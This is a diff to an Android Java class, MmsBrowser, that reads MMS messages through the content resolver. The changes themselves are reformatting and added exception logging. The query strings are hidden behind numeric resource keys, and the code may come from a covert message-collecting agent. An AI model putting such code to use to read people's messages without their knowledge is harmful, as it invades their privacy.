@@ -39,8 +39,9 @@ public class MmsBrowser {
 	}
 
 	private void parse(String content, boolean sentState) {
-		final String[] projection = new String[] { Messages.getString("13.2"), Messages.getString("13.3"), Messages.getString("13.4"), Messages.getString("13.5") }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
-		final String selection = Messages.getString("13.5")+Messages.getString("13.6"); //$NON-NLS-1$
+		final String[] projection = new String[] {
+				Messages.getString("13.2"), Messages.getString("13.3"), Messages.getString("13.4"), Messages.getString("13.5") }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+		final String selection = Messages.getString("13.5") + Messages.getString("13.6"); //$NON-NLS-1$
 
 		final Cursor c = Status.getAppContext().getContentResolver().query(Uri.parse(content), null, null, null, null);
 
@@ -60,7 +61,7 @@ public class MmsBrowser {
 				final String name = c.getColumnName(j);
 				final String value = c.getString(c.getColumnIndex(name));
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): " + name + " = " + value) ;//$NON-NLS-1$ //$NON-NLS-2$
+					Check.log(TAG + " (parse): " + name + " = " + value);//$NON-NLS-1$ //$NON-NLS-2$
 				}
 			}
 
@@ -89,8 +90,12 @@ public class MmsBrowser {
 
 				sentStatus = sentState;
 			} catch (final Exception e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
-					Check.log(e) ;//$NON-NLS-1$
+					Check.log(e);//$NON-NLS-1$
 				}
 				c.close();
 				return;
@@ -102,17 +107,26 @@ public class MmsBrowser {
 				final int id = Integer.parseInt(c.getString(c.getColumnIndex(Messages.getString("13.16"))).toString()); //$NON-NLS-1$
 				m.setId(id);
 			} catch (final Exception e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
-					Check.log(e) ;//$NON-NLS-1$
+					Check.log(e);//$NON-NLS-1$
 				}
 			}
 
 			try {
-				final int thread_id = Integer.parseInt(c.getString(c.getColumnIndex(Messages.getString("13.17"))).toString()); //$NON-NLS-1$
+				final int thread_id = Integer.parseInt(c
+						.getString(c.getColumnIndex(Messages.getString("13.17"))).toString()); //$NON-NLS-1$
 				m.setThreadId(thread_id);
 			} catch (final Exception e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
-					Check.log(e) ;//$NON-NLS-1$
+					Check.log(e);//$NON-NLS-1$
 				}
 			}
 
